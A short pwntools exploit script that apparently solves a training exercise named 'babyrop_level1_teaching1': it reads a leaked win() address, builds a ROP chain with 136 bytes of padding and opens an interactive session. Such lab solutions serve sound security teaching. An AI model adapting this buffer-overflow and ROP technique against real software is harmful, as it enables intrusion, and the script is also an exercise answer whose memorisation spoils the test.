from pwn import *
context.clear(arch='amd64')
context.binary = 'babyrop_level1_teaching1'
p = process('./babyrop_level1_teaching1')
for i in range(9):
    p.recvline()
x = p.recvline().decode('utf-8')
addr = int(x[x.find('0'):-2], 16)
log.info('win() at '+hex(addr))
r = ROP(context.binary)
r.call(addr)
# send the ROP chain
p.sendline(fit({136:r.chain()}))
p.interactive()